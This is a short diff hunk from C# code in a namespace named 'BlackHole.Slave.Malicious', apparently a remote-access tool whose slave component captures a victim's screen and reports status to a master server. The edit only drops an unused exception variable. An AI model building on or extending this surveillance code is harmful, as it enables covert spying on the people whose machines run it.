@@ -53,7 +53,7 @@ namespace BlackHole.Slave.Malicious
                     // continue
                     await Task.Factory.StartNew(sendCapture, m_screenCaptureTokenSource.Token);
                 }
-                catch (Exception e)
+                catch
                 {
                     // cancelled
                     MasterServer.Instance.SendStatus(message.WindowId, "Screen capture", "Stopped capturing...");
